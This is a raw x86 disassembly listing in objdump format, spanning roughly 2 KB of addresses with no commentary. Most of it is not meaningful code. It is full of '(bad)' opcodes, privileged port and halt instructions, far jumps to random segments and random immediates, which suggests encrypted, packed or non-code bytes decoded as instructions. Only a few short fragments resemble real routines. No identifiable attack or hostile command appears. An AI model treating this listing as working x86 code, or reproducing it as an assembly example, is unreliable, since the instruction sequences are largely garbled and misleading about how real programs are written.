  41334a:	xlat   BYTE PTR ds:[ebx]
  41334b:	pop    edx
  41334c:	jbe    0x413345
  41334e:	rol    BYTE PTR [ecx+0x6420ab61],cl
  413354:	sub    bl,BYTE PTR [eax-0x2a1d0754]
  41335a:	lahf   
  41335b:	dec    ebx
  41335c:	jl     0x41337d
  41335e:	pop    esi
  41335f:	fdiv   st,st(5)
  413361:	out    dx,al
  413362:	sub    ebx,DWORD PTR [edi]
  413364:	sub    DWORD PTR [edx],edx
  413366:	out    0xaf,al
  413368:	shr    BYTE PTR [edi+0x1b],cl
  41336b:	jbe    0x41338a
  41336d:	inc    eax
  41336e:	jns    0x413331
  413370:	or     eax,0x9695f017
  413375:	adc    BYTE PTR [ebx+esi*4-0x2c029ad6],dl
  41337c:	cmp    al,dl
  41337e:	and    eax,0x68ecae2f
  413383:	mov    al,ds:0x9f32dd8c
  413388:	mov    esi,0x2d8a7351
  41338d:	adc    eax,ecx
  41338f:	adc    al,0x5a
  413391:	hlt    
  413392:	pop    esp
  413393:	imul   ebx,DWORD PTR [ecx],0x5b
  413396:	xor    ebx,ebp
  413398:	inc    esi
  413399:	loopne 0x413349
  41339b:	add    edx,DWORD PTR [edx-0x11]
  41339e:	gs dec esp
  4133a0:	cmp    BYTE PTR [esi+0x36],0xa2
  4133a4:	jge    0x4133fd
  4133a6:	jecxz  0x413406
  4133a8:	sahf   
  4133a9:	daa    
  4133aa:	mov    ds:0xb7a12d8a,al
  4133af:	inc    ebx
  4133b0:	cmp    BYTE PTR [ecx],cl
  4133b2:	jne    0x413429
  4133b4:	jo     0x413357
  4133b6:	test   DWORD PTR [edi+0x3d],ecx
  4133b9:	cmp    BYTE PTR [ebp-0x1f76978c],al
  4133bf:	cmp    eax,0x5393a880
  4133c4:	xchg   ebp,eax
  4133c5:	pop    es
  4133c6:	mov    fs,WORD PTR [eax+0x8]
  4133c9:	mov    DWORD PTR [ecx+0x704433f6],esi
  4133cf:	push   edx
  4133d0:	sbb    al,0x64
  4133d2:	xor    al,0xd4
  4133d4:	or     BYTE PTR [ecx-0x1e29f83a],0xea
  4133db:	xchg   esi,eax
  4133dc:	sub    BYTE PTR [ecx-0x5d],dh
  4133df:	cld    
  4133e0:	jl     0x4133fd
  4133e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4133e3:	fstp   TBYTE PTR [esp+edi*2+0x279a8010]
  4133ea:	push   ecx
  4133eb:	mov    ch,BYTE PTR [ecx+ecx*8-0x5d0c1c83]
  4133f2:	cmc    
  4133f3:	iret   
  4133f4:	xchg   ebx,eax
  4133f5:	imul   ax,bx,0x29eb
  4133fa:	fsubr  st(0),st
  4133fc:	dec    ebx
  4133fd:	mov    bl,0xed
  4133ff:	or     esi,edx
  413401:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413402:	mov    ch,0x3a
  413404:	fs inc edx
  413406:	mov    eax,0x62ae922c
  41340b:	xchg   DWORD PTR [edi-0x6d],esp
  41340e:	pushf  
  41340f:	add    eax,0xe52bef17
  413414:	lahf   
  413415:	addr16 jnp 0x4133ea
  413418:	xchg   ecx,eax
  413419:	pop    ecx
  41341a:	cmp    edx,edx
  41341c:	sub    esp,DWORD PTR [ebx+eiz*4+0xcd2f4e9]
  413423:	call   0x4a32:0x1a91522a
  41342a:	(bad)  
  41342b:	cmp    BYTE PTR [esi],bh
  41342d:	bound  eax,QWORD PTR [esi-0x2f]
  413430:	push   0x6e
  413432:	in     eax,dx
  413433:	and    bl,bh
  413435:	xlat   BYTE PTR ds:[ebx]
  413436:	ret    
  413437:	aad    0x3a
  413439:	(bad)  
  41343b:	out    0xcc,eax
  41343d:	adc    BYTE PTR [ebx],al
  41343f:	jge    0x41342d
  413441:	mov    ebx,DWORD PTR [ebp-0x1c]
  413444:	mov    BYTE PTR [edi+ebx*1+0x327298],dl
  41344b:	jmp    0x4136d3
  413450:	enter  0xd1c5,0xc0
  413454:	(bad)  
  413456:	(bad)  
  413458:	cld    
  413459:	imul   ecx,esi,0x89e6675e
  41345f:	inc    bx
  413461:	js     0x4134e2
  413463:	js     0x41344a
  413465:	jle    0x4134df
  413467:	js     0x4134d3
  413469:	popa   
  41346a:	sar    DWORD PTR [ebx+0x6e],0xa8
  41346e:	retf   0x8ca0
  413471:	ss inc ebx
  413473:	cmc    
  413474:	mov    DWORD PTR [ebp+edi*8-0x11],ebp
  413478:	ror    bh,0x1a
  41347b:	push   ebx
  41347c:	sbb    bl,BYTE PTR [esp+ebx*1-0x7e7c972c]
  413483:	jb     0x4134da
  413485:	pop    esp
  413486:	jne    0x413430
  413488:	sti    
  413489:	pushf  
  41348a:	daa    
  41348b:	cmp    eax,0x88db0498
  413490:	in     al,0x16
  413492:	icebp  
  413493:	out    0x45,eax
  413495:	mul    BYTE PTR [ecx-0x2900e718]
  41349b:	imul   ebp,edi,0xd218ec14
  4134a1:	inc    ecx
  4134a2:	or     DWORD PTR [edx+0x293af9a0],0xfffffff8
  4134a9:	push   es
  4134aa:	push   0xd
  4134ac:	add    eax,0xd5044453
  4134b1:	pop    ebp
  4134b2:	in     eax,0x14
  4134b4:	dec    edx
  4134b5:	lds    edx,FWORD PTR [ecx-0x3e]
  4134b8:	aas    
  4134b9:	popa   
  4134ba:	test   dh,dl
  4134bc:	enter  0x86b7,0xb2
  4134c0:	mov    bh,0x6b
  4134c2:	jmp    FWORD PTR [ebp-0x72f3002c]
  4134c8:	dec    eax
  4134c9:	adc    dl,BYTE PTR [ecx-0x5f]
  4134cc:	js     0x413484
  4134ce:	xchg   edx,eax
  4134cf:	sub    cl,0xfb
  4134d2:	jnp    0x41347f
  4134d4:	add    edi,edx
  4134d6:	push   esp
  4134d7:	and    al,0x9d
  4134d9:	sbb    al,0x7b
  4134db:	and    BYTE PTR [eax],al
  4134dd:	lahf   
  4134de:	or     DWORD PTR ds:0xf6dae312,ebp
  4134e4:	repz jmp 0x108c:0x5e3ac2f0
  4134ec:	ror    BYTE PTR [ebp-0xd],0x3a
  4134f0:	jge    0x4134b2
  4134f2:	lock sbb DWORD PTR [ecx],0x64
  4134f6:	rcl    bl,1
  4134f8:	adc    edi,DWORD PTR [ebx]
  4134fa:	rcr    DWORD PTR cs:[eax+esi*1],cl
  4134fe:	bound  eax,QWORD PTR [edx+0x75]
  413501:	mov    edx,0x1eabcc96
  413506:	jo     0x413571
  413508:	popa   
  413509:	fcmovnbe st,st(6)
  41350b:	jno    0x41358c
  41350d:	stos   BYTE PTR es:[edi],al
  41350e:	into   
  41350f:	or     ebx,DWORD PTR gs:[edi+0x6d]
  413513:	pop    ebp
  413514:	mov    eax,0xeb94e79b
  413519:	mov    ebp,ebp
  41351b:	sar    DWORD PTR [edx+0x2a],cl
  41351e:	mov    ds:0x56fca910,eax
  413523:	sti    
  413524:	xchg   edx,eax
  413525:	push   0x6902abd
  41352a:	pop    eax
  41352b:	mov    eax,ds:0xc2a4110d
  413530:	xlat   BYTE PTR ds:[ebx]
  413531:	sar    DWORD PTR [eax+0x1d0e00b7],0x10
  413538:	data16 xor al,0x3
  41353b:	cdq    
  41353c:	in     al,0x50
  41353e:	call   0xdfda393c
  413543:	in     eax,0x58
  413545:	addr16 mov al,ds:0x9f0d
  413549:	div    dl
  41354b:	inc    ebx
  41354c:	adc    BYTE PTR [ecx],al
  41354e:	imul   ebp,DWORD PTR [edi-0x7c],0xa68561d9
  413555:	cs or  al,0xb7
  413558:	mov    dh,BYTE PTR [edi-0x27]
  41355b:	sti    
  41355c:	inc    ecx
  41355d:	mov    ebx,0xf79b0c2f
  413562:	outs   dx,DWORD PTR ds:[esi]
  413563:	fstp   st(2)
  413565:	int    0x53
  413567:	and    eax,esp
  413569:	jmp    0xa844:0x5b231a29
  413570:	mov    esp,0xadfa6871
  413575:	mov    eax,0xff7b59e2
  41357a:	out    0x39,eax
  41357c:	mov    eax,ds:0xcf94bece
  413581:	loop   0x4135b8
  413583:	cmp    eax,0x20529628
  413588:	inc    ebx
  413589:	dec    esi
  41358a:	lahf   
  41358b:	ret    
  41358c:	cmp    ch,BYTE PTR [ebx+0x7f]
  41358f:	jae    0x413575
  413591:	das    
  413592:	or     ecx,ecx
  413594:	jbe    0x41356d
  413596:	mov    al,0xd1
  413598:	enter  0xd65,0x4
  41359c:	fidiv  WORD PTR es:[edi-0x1a2f0ec1]
  4135a3:	pop    eax
  4135a4:	ror    ecx,cl
  4135a6:	inc    esp
  4135a7:	jecxz  0x41353a
  4135a9:	shl    DWORD PTR [edx+eiz*8+0x6ea589e4],1
  4135b0:	pop    eax
  4135b1:	mov    ebx,0xbc0e123b
  4135b6:	mov    cl,0xfb
  4135b8:	loope  0x41353f
  4135ba:	inc    edi
  4135bb:	enter  0xeca6,0x5b
  4135bf:	js     0x4135d6
  4135c1:	sub    BYTE PTR [edx+ebp*8-0x3d],dl
  4135c5:	and    eax,0xd0808451
  4135ca:	add    ebp,DWORD PTR [edx]
  4135cc:	(bad)  
  4135cd:	mov    eax,0xd7cfbf1
  4135d2:	test   DWORD PTR [edx],0x8901fd5a
  4135d8:	retf   
  4135d9:	adc    bl,BYTE PTR [ecx]
  4135db:	push   ds
  4135dc:	push   eax
  4135dd:	inc    edi
  4135de:	stos   BYTE PTR es:[edi],al
  4135df:	mov    eax,ds:0xdde30811
  4135e4:	jl     0x4135c4
  4135e6:	test   al,0x5d
  4135e8:	(bad)  
  4135e9:	in     eax,0x75
  4135eb:	sub    eax,0x311f0b72
  4135f0:	mov    fs,WORD PTR [edi+0x68a55159]
  4135f6:	aaa    
  4135f7:	pop    DWORD PTR [ebx-0x358bce8a]
  4135fd:	or     eax,0xed8e647c
  413602:	and    bh,BYTE PTR [ebx+0x46]
  413605:	mov    BYTE PTR [esi],bh
  413607:	xchg   edx,eax
  413608:	int3   
  413609:	pop    edx
  41360a:	test   BYTE PTR [edx+0x4d],ch
  41360d:	push   eax
  41360e:	outs   dx,BYTE PTR ds:[esi]
  41360f:	fwait
  413610:	inc    eax
  413611:	nop
  413612:	into   
  413613:	aam    0x9c
  413615:	cmp    BYTE PTR [eax+eiz*4-0xf],0xdb
  41361a:	xor    BYTE PTR [ebx],ch
  41361c:	jp     0x413698
  41361e:	xor    eax,0x205e72e7
  413623:	add    ecx,eax
  413625:	jo     0x413678
  413627:	add    eax,0x9fa8328f
  41362c:	and    DWORD PTR [ebx],esi
  41362e:	(bad)  
  41362f:	cmp    edx,DWORD PTR [ecx-0x6194908b]
  413635:	jmp    0x1dde0e61
  41363a:	imul   esi,DWORD PTR [edi],0xffffffa3
  41363d:	mov    dl,0xb
  41363f:	cmp    eax,0xe92de890
  413644:	jle    0x413675
  413646:	mov    esp,0xdca9c3e7
  41364b:	and    BYTE PTR [ebp+esi*1-0x53],bh
  41364f:	cdq    
  413650:	mov    ebx,0xdbd025e2
  413655:	cwde   
  413656:	cld    
  413657:	mov    ecx,DWORD PTR [ecx+0xa900527]
  41365d:	mov    esp,0x64e883a2
  413662:	sbb    ch,dh
  413664:	stos   DWORD PTR es:[edi],eax
  413665:	outs   dx,BYTE PTR ds:[esi]
  413666:	push   es
  413667:	into   
  413668:	jo     0x4136ba
  41366a:	mov    BYTE PTR [eax-0x24b65b3e],dl
  413670:	xchg   BYTE PTR es:[eax-0x7c],al
  413674:	out    dx,al
  413675:	xor    DWORD PTR [eax-0x5f030487],0x9a9af290
  41367f:	pop    esi
  413680:	mov    esi,0xc8e12c88
  413685:	pop    es
  413686:	and    al,0xa6
  413688:	sbb    eax,0x47c0809c
  41368d:	fwait
  41368e:	lods   eax,DWORD PTR ds:[esi]
  41368f:	pop    esp
  413690:	aam    0x89
  413692:	rol    BYTE PTR [edi+edx*1+0x1c],0x5e
  413697:	scas   eax,DWORD PTR es:[edi]
  413698:	inc    edi
  413699:	test   DWORD PTR [ebp-0x527a3f53],ebp
  41369f:	int3   
  4136a0:	dec    eax
  4136a1:	mov    al,ds:0xecf93cd2
  4136a6:	test   eax,0xb591061b
  4136ab:	push   es
  4136ac:	push   es
  4136ad:	int3   
  4136ae:	out    0x49,al
  4136b0:	sbb    bl,dl
  4136b2:	ficomp WORD PTR [esi]
  4136b4:	mov    dl,BYTE PTR [ebp-0x20bfd735]
  4136ba:	xor    edx,DWORD PTR [ebx+0x61a2dfb6]
  4136c0:	(bad)  
  4136c1:	sub    eax,0x7cb74874
  4136c6:	add    ecx,DWORD PTR [ecx+0x19527c37]
  4136cc:	push   0x9616b33c
  4136d1:	das    
  4136d2:	bound  ecx,QWORD PTR [ebx+0x7d8bbc55]
  4136d8:	hlt    
  4136d9:	xor    edx,eax
  4136db:	xor    edi,eax
  4136dd:	add    edx,ecx
  4136df:	add    edi,ecx
  4136e1:	jmp    0x413969
  4136e6:	ror    ecx,0xc2
  4136e9:	ror    dl,0xc7
  4136ec:	leave  
  4136ed:	leave  
  4136ee:	mov    ?,WORD PTR [ebp-0x4e6d8de7]
  4136f4:	fdiv   QWORD PTR [edx+0x787f7d28]
  4136fa:	in     eax,0x7e
  4136fc:	js     0x413776
  4136fe:	std    
  4136ff:	sbb    eax,0x627709a
  413704:	pop    edi
  413705:	sbb    eax,edx
  413707:	rcr    DWORD PTR [edi],0xa2
  41370a:	mov    ebp,ebp
  41370c:	retf   0x4ceb
  41370f:	inc    ebx
  413710:	jb     0x41376b
  413712:	call   0xa4149c63
  413717:	pop    edi
  413718:	xor    cl,BYTE PTR [esi+ebp*1]
  41371b:	mov    ebp,0xe8ae0e47
  413720:	(bad)  
  413722:	cmp    al,0x1a
  413724:	jo     0x41374c
  413726:	dec    edi
  413727:	mov    WORD PTR [ebx+0x72],ss
  41372a:	(bad)  
  41372b:	push   ds
  41372c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41372d:	gs sbb al,bl
  413730:	push   eax
  413731:	push   ecx
  413732:	cmp    eax,0xdb018b4d
  413737:	sub    eax,0x22ab33a3
  41373c:	and    DWORD PTR [ecx],ebp
  41373e:	fstp   TBYTE PTR [ebx-0x95b9c7e]
  413744:	iret   
  413745:	pop    eax
  413746:	imul   ebp,edi,0xffffffa3
  413749:	nop
  41374a:	push   edi
  41374b:	xchg   ecx,eax
  41374c:	adc    al,0x16
  41374e:	imul   edi,DWORD PTR ds:0xa257fa45,0xe9ee189f
  413758:	cmp    DWORD PTR [ebx-0x3a3d1d9a],esi
  41375e:	(bad)  
  41375f:	jbe    0x413709
  413761:	dec    ebx
  413762:	xor    DWORD PTR ds:0xd3b38d5f,0xd0e53a82
  41376c:	lds    esi,FWORD PTR [ebx-0x7f]
  41376f:	cmp    DWORD PTR [edx],edx
  413771:	cld    
  413772:	push   ebx
  413773:	pop    ss
  413774:	mov    al,ds:0x8ff4ca02
  413779:	mov    dl,0x38
  41377b:	fisubr DWORD PTR [esi-0x5]
  41377e:	adc    BYTE PTR [edx+0x309972a7],dl
  413784:	test   eax,0x32a08ca
  413789:	test   BYTE PTR [eax],cl
  41378b:	xchg   edi,eax
  41378c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41378d:	pop    edx
  41378e:	arpl   WORD PTR [edx+0x6ae00afe],sp
  413794:	ja     0x413730
  413796:	lods   eax,DWORD PTR ds:[esi]
  413797:	dec    esp
  413798:	jle    0x413738
  41379a:	gs std 
  41379c:	push   0xffffffb0
  41379e:	int3   
  41379f:	jmp    0x4137b9
  4137a1:	stos   BYTE PTR es:[edi],al
  4137a2:	in     eax,dx
  4137a3:	push   edx
  4137a4:	adc    esi,DWORD PTR [ebp-0x6f]
  4137a7:	push   edi
  4137a8:	retf   0xc2df
  4137ab:	mov    ds:0x2eef15bc,al
  4137b0:	and    eax,0x9c7a763b
  4137b5:	pusha  
  4137b6:	dec    edx
  4137b7:	pop    eax
  4137b8:	out    0x8a,eax
  4137ba:	iret   
  4137bb:	in     eax,0x18
  4137bd:	pop    ecx
  4137be:	jg     0x4137f5
  4137c0:	pop    ebp
  4137c1:	cdq    
  4137c2:	call   0xeb2f7095
  4137c7:	adc    al,0x83
  4137c9:	ins    DWORD PTR es:[edi],dx
  4137ca:	int    0x2a
  4137cc:	push   0xea6ac6de
  4137d1:	xlat   BYTE PTR ds:[ebx]
  4137d2:	and    DWORD PTR [ebx+0x17],ecx
  4137d5:	adc    BYTE PTR [ecx+ecx*2+0x57925b39],ch
  4137dc:	or     DWORD PTR [ebp+0x5f],ebp
  4137df:	daa    
  4137e0:	jae    0x4137fe
  4137e2:	jbe    0x4137c9
  4137e4:	mov    DWORD PTR [ebx-0x55],eax
  4137e7:	inc    esp
  4137e8:	mov    WORD PTR [ecx],ss
  4137ea:	sub    al,0x33
  4137ec:	int    0xf4
  4137ee:	jns    0x41382a
  4137f0:	es add al,0x49
  4137f3:	fs push 0x55b97b28
  4137f9:	shr    bl,1
  4137fb:	iret   
  4137fc:	mov    edx,0x3ae7651a
  413801:	inc    eax
  413802:	div    DWORD PTR [ebp+0x6cfbdbfa]
  413808:	or     al,0x7c
  41380a:	test   BYTE PTR [ebp+esi*1+0xd],al
  41380e:	mov    esp,0x59f25788
  413813:	sbb    ebx,DWORD PTR [esi+0xb80a48a]
  413819:	add    eax,0x8b004737
  41381e:	in     eax,dx
  41381f:	loope  0x4137b7
  413821:	dec    ebp
  413822:	mov    cl,0x5f
  413824:	sub    eax,DWORD PTR [eax]
  413826:	scas   eax,DWORD PTR es:[edi]
  413827:	mov    eax,es
  413829:	retf   0x5bb4
  41382c:	jne    0x41383d
  41382e:	xor    di,bp
  413831:	scas   eax,DWORD PTR es:[edi]
  413832:	push   eax
  413833:	std    
  413834:	sub    DWORD PTR [eax],0x36a8cbae
  41383a:	jecxz  0x4137e8
  41383c:	push   ss
  41383d:	sbb    ecx,0xa605b799
  413843:	ss pushf 
  413845:	ret    
  413846:	fwait
  413847:	lods   al,BYTE PTR ds:[esi]
  413848:	aaa    
  413849:	sbb    eax,0x91e301da
  41384e:	and    BYTE PTR [edx-0xc371bc4],dh
  413854:	mov    ah,0x7
  413856:	test   edx,0x190a6a6
  41385c:	fadd   DWORD PTR [edx+ebx*2-0x6b]
  413860:	pop    ecx
  413861:	sub    al,0x47
  413864:	cld    
  413865:	addr16 aas 
  413867:	fst    DWORD PTR [esi-0xe]
  41386a:	repz fdiv QWORD PTR [eax+0x3e60b2a9]
  413871:	cmp    BYTE PTR [ebp-0x6b],0x0
  413875:	push   ss
  413876:	jg     0x413865
  413878:	cmp    bl,BYTE PTR [ecx-0x36999153]
  41387e:	(bad)  
  41387f:	pop    edi
  413880:	stos   BYTE PTR es:[edi],al
  413881:	jmp    0x31a7:0x5c6f48b2
  413888:	stos   BYTE PTR es:[edi],al
  413889:	daa    
  41388a:	pop    ebp
  41388b:	and    eax,0x4ea6ca99
  413890:	(bad)  
  413891:	call   0xf7aa:0x5a396088
  413898:	dec    edx
  413899:	dec    edi
  41389a:	in     eax,dx
  41389b:	or     DWORD PTR [edi-0x36954c95],eax
  4138a1:	mov    WORD PTR [ebx-0x7eb74989],gs
  4138a7:	(bad)  [esi-0x58be2c02]
  4138ad:	dec    ecx
  4138ae:	(bad)  
  4138b0:	or     ecx,esp
  4138b2:	ins    DWORD PTR es:[edi],dx
  4138b3:	in     eax,dx
  4138b4:	sti    
  4138b5:	pop    ecx
  4138b6:	lahf   
  4138b7:	pop    edx
  4138b8:	jbe    0x413910
  4138ba:	mov    ah,0x4b
  4138bc:	pop    ds
  4138bd:	ins    DWORD PTR es:[edi],dx
  4138be:	jge    0x413920
  4138c0:	or     ecx,DWORD PTR [ebp-0x5eccd346]
  4138c6:	jge    0x41384f
  4138c8:	or     dh,dh
  4138ca:	lahf   
  4138cb:	pop    ss
  4138cc:	or     al,0xed
  4138ce:	aam    0xf9
  4138d0:	test   DWORD PTR [ecx-0x435a59a0],ecx
  4138d6:	cli    
  4138d7:	lahf   
  4138d8:	scas   eax,DWORD PTR es:[edi]
  4138d9:	mov    esp,0x78aaeea9
  4138de:	inc    eax
  4138df:	(bad)
  4138e2:	cmp    al,0x5d
  4138e4:	sbb    BYTE PTR ds:0x1f10dae5,0x23
  4138eb:	dec    ebx
  4138ec:	mov    dh,0xa9
  4138ee:	loope  0x4138cc
  4138f0:	sbb    dl,0x21
  4138f3:	jmp    0x1c0a:0xb4ae80f1
  4138fa:	xchg   esp,eax
  4138fb:	(bad)
  4138ff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413900:	xchg   edx,eax
  413901:	or     al,0x21
  413903:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413904:	dec    edx
  413905:	inc    eax
  413906:	xor    cl,BYTE PTR [ebx]
  413908:	sub    al,0x5b
  41390a:	push   esi
  41390b:	loop   0x4138be
  41390d:	cwde   
  41390e:	mov    al,0xfe
  413910:	mov    edi,0xd994d7de
  413915:	dec    edi
  413916:	das    
  413917:	push   cs
  413918:	xor    ch,bh
  41391a:	mov    ecx,0x5373aba
  41391f:	jl     0x413904
  413921:	or     DWORD PTR [ecx],0xb573f5ff
  413927:	dec    BYTE PTR [edx-0x2ee98aef]
  41392d:	mov    edi,0x747299f2
  413932:	pushf  
  413933:	or     ebp,esp
  413935:	inc    ecx
  413936:	shl    DWORD PTR [esi],cl
  413938:	ds ret 
  41393a:	xor    DWORD PTR [ebp+0x67c8185d],ebx
  413940:	add    al,0x41
  413942:	(bad)  
  413943:	mov    ah,0xee
  413945:	xchg   esi,eax
  413946:	sahf   
  413947:	xor    DWORD PTR [eax-0x6c],eax
  41394a:	mov    esp,0x47353f2b
  41394f:	xchg   edx,eax
  413950:	(bad)  
  413951:	stos   DWORD PTR es:[edi],eax
  413952:	fcmovnu st,st(7)
  413954:	push   cs
  413955:	jecxz  0x413976
  413957:	mov    ebp,0xd18a3150
  41395c:	test   DWORD PTR [ecx],ebp
  41395e:	cmp    ecx,esi
  413960:	sahf   
  413961:	rcr    DWORD PTR [ecx-0x54],cl
  413964:	push   edi
  413965:	repz and eax,0xaf0fcde7
  41396b:	xlat   BYTE PTR ds:[ebx]
  41396c:	add    edx,DWORD PTR [ebp-0x14]
  41396f:	mov    DWORD PTR [ebp-0x14],edx
  413972:	mov    edx,DWORD PTR [ebp-0xc]
  413975:	mov    edi,DWORD PTR [ebp-0x24]
  413978:	xor    edx,eax
  41397a:	add    edx,ecx
  41397c:	imul   edx,edi
  41397f:	mov    edi,DWORD PTR [ebp-0xc]
  413982:	xor    edi,eax
  413984:	jmp    0x413c0c
  413989:	enter  0xc4cf,0xca
  41398d:	retf   
  41398e:	fxch   st(6)
  413990:	fld    DWORD PTR [edx]
  413992:	xchg   edx,eax
  413993:	(bad)  
  413994:	loope  0x4139fb
  413996:	outs   dx,DWORD PTR ds:[esi]
  413997:	mov    ds:0x7f0395b3,al
  41399c:	js     0x413983
  41399e:	jle    0x413a18
  4139a0:	js     0x413950
  4139a2:	xchg   esp,eax
  4139a3:	mov    cl,0xe0
  4139a5:	and    eax,0x33f0fb3a
  4139aa:	push   cs
  4139ab:	xchg   edi,eax
  4139ac:	sbb    ch,BYTE PTR [ecx+0x4a]
  4139af:	mov    ah,0xdb
  4139b1:	adc    eax,0x78f5998c
  4139b6:	cdq    
  4139b7:	inc    ebx
  4139b8:	in     eax,0x4e
  4139ba:	fcomp  DWORD PTR [edi-0x15]
  4139bd:	ins    DWORD PTR es:[edi],dx
  4139be:	daa    
  4139bf:	popa   
  4139c0:	mov    ah,0xd
  4139c2:	sub    eax,DWORD PTR [eax+0x317af7d]
  4139c8:	push   esp
  4139c9:	out    0xfe,al
  4139cb:	adc    ah,cl
  4139cd:	rcl    esp,0x71
  4139d0:	in     eax,0xc5
  4139d2:	sbb    eax,0xa5e84020
  4139d7:	les    ebx,FWORD PTR [ecx-0x1e2638d6]
  4139dd:	dec    edi
  4139de:	ror    BYTE PTR [edi-0x7b60fe28],1
  4139e4:	mov    dh,0xb5
  4139e6:	ret    0x4cd5
  4139e9:	cld    
  4139ea:	sar    BYTE PTR [edx+0x75d09c4f],0x14
  4139f1:	hlt    
  4139f2:	adc    ebp,DWORD PTR [edx+0x2f]
  4139f5:	xlat   BYTE PTR ds:[ebx]
  4139f6:	gs sbb ah,cl
  4139f9:	mov    bh,0xa1
  4139fb:	jmp    0x413984
  4139fd:	mov    dh,0x98
  4139ff:	in     al,dx
  413a00:	mov    esi,0xd338b363
  413a05:	aam    0x19
  413a07:	fsubr  QWORD PTR [ebx+edi*8+0x1f]
  413a0b:	gs out 0x9f,al
  413a0e:	pop    edx
  413a0f:	push   edx
  413a10:	fwait
  413a11:	adc    edi,DWORD PTR [esi]
  413a13:	sub    eax,0xf4624e40
  413a18:	pop    ds
  413a19:	adc    DWORD PTR [ecx],edi
  413a1b:	ret    0xc9d1
  413a1e:	cmp    BYTE PTR [esi+0x3d29de0c],dl
  413a24:	outs   dx,BYTE PTR ds:[esi]
  413a25:	inc    ebp
  413a26:	inc    esi
  413a27:	sbb    DWORD PTR [edi+0x583e0696],edx
  413a2d:	cmp    eax,0x5b1f7586
  413a32:	sub    DWORD PTR [edx-0x2eb922b4],edx
  413a38:	pop    eax
  413a39:	stc    
  413a3a:	xchg   edi,eax
  413a3b:	scas   eax,DWORD PTR es:[edi]
  413a3c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413a3d:	jecxz  0x413a35
  413a3f:	mov    eax,ds:0xf64ba176
  413a44:	ins    BYTE PTR es:[edi],dx
  413a45:	cld    
  413a46:	xchg   ebx,eax
  413a47:	adc    eax,0xa5a66b00
  413a4c:	lahf   
  413a4d:	xchg   edx,eax
  413a4e:	sbb    DWORD PTR [ecx],eax
  413a50:	mov    dl,0x3
  413a52:	pop    es
  413a53:	(bad)  
  413a54:	mul    BYTE PTR [esi+0x25]
  413a57:	xchg   DWORD PTR [ebp-0x7004e87a],edi
  413a5d:	lock rcr DWORD PTR [ebp+0x312af0ab],1
  413a64:	add    DWORD PTR [ebx+0x5],eax
  413a67:	fidivr DWORD PTR [ebx+0x70f4f20f]
  413a6d:	aas    
  413a6e:	add    DWORD PTR [ecx+ebx*1-0x31],0x62af8422
  413a76:	int3   
  413a77:	mov    esp,0xda9b8c75
  413a7c:	mov    al,ds:0x22dab42d
  413a81:	adc    al,0xe4
  413a83:	icebp  
  413a84:	add    ebp,DWORD PTR [edx]
  413a86:	and    eax,0x90b79668
  413a8b:	lock push esi
  413a8d:	je     0x413ac5
  413a8f:	xor    eax,edi
  413a91:	outs   dx,DWORD PTR ds:[esi]
  413a92:	int    0x76
  413a94:	adc    al,0xc5
  413a96:	loope  0x413b04
  413a98:	fcmovnb st,st(4)
  413a9a:	pop    edx
  413a9b:	or     dh,BYTE PTR [eax+eiz*8+0x23]
  413a9f:	xchg   ebp,eax
  413aa0:	ins    BYTE PTR es:[edi],dx
  413aa1:	test   BYTE PTR [ebx+0x73],0x50
  413aa5:	fcomi  st,st(5)
  413aa7:	mov    ch,0x1a
  413aa9:	push   0x2e743f48
  413aae:	xor    eax,0xa12100c6
  413ab3:	shr    BYTE PTR [eax-0x475af711],0x3c
  413aba:	mov    eax,ds:0xb0fb3c19
  413abf:	call   0xff3c:0xe494caf
  413ac6:	jl     0x413b28
  413ac8:	fld    QWORD PTR [esi]
  413aca:	scas   eax,DWORD PTR es:[edi]
  413acb:	icebp  
  413acc:	les    ecx,FWORD PTR [edx-0x3306c3cd]
  413ad2:	sub    DWORD PTR [ecx+esi*2-0xea2aac8],ebx
  413ad9:	fsub   QWORD PTR [ebx+0x77]
  413adc:	inc    esp
  413add:	ja     0x413b15
  413adf:	jecxz  0x413a9a
  413ae1:	xor    dl,bl
  413ae3:	rol    BYTE PTR [esp+esi*8],1
  413ae6:	ins    DWORD PTR es:[edi],dx
  413ae7:	add    al,0xbe
  413ae9:	jns    0x413b5c
  413aeb:	mov    edx,0xf291da14
  413af0:	aaa    
  413af1:	jbe    0x413a87
  413af3:	or     edi,DWORD PTR [ecx+0x1]
  413af6:	call   FWORD PTR [ecx+0x21bc49bf]
  413afc:	cmp    edi,edi
  413afe:	mov    eax,0xfffbe485
  413b03:	mov    bl,0xc5
  413b05:	xchg   edx,eax
  413b06:	pop    edi
  413b07:	(bad)  
  413b08:	lock or BYTE PTR [ecx+0x52],dl
  413b0c:	inc    eax
  413b0d:	fadd   DWORD PTR [ebx-0x642cf10f]
  413b13:	clc    
  413b14:	adc    esi,DWORD PTR [ecx-0x4d]
  413b17:	add    ah,BYTE PTR [ebx-0x7c]
  413b1a:	jecxz  0x413aa9
  413b1c:	fisttp QWORD PTR [ebx]
  413b1e:	aas    
  413b1f:	mov    edx,0xb08839e4
  413b24:	loope  0x413aff
  413b26:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413b27:	pop    ds
  413b28:	sbb    ecx,ebx
  413b2a:	xchg   esi,eax
  413b2b:	(bad)  
  413b2c:	loope  0x413ab6
  413b2e:	or     DWORD PTR [ebx+0x19218fef],ecx
  413b34:	les    ebx,FWORD PTR [bx+di+0x336f]
  413b39:	mov    al,0xc9
  413b3b:	test   DWORD PTR [esi-0x43],eax
  413b3e:	out    0x1d,eax
  413b40:	push   edx
  413b41:	je     0x413b5a
  413b43:	icebp  
  413b44:	xchg   DWORD PTR [edx],ecx
  413b46:	xchg   DWORD PTR [ebx+0x0],esi
  413b49:	repnz sub DWORD PTR [edx-0x27],edx
  413b4d:	outs   dx,DWORD PTR ds:[esi]
  413b4e:	pop    es
  413b4f:	sbb    bl,BYTE PTR [edi+ecx*4-0x4e]
  413b53:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413b54:	pop    esp
  413b55:	xchg   DWORD PTR [eax+0x78],esi
  413b58:	fimul  WORD PTR [esi-0x7b]
  413b5b:	adc    DWORD PTR [eax+0x2b],esp
  413b5e:	cmp    al,0xf9
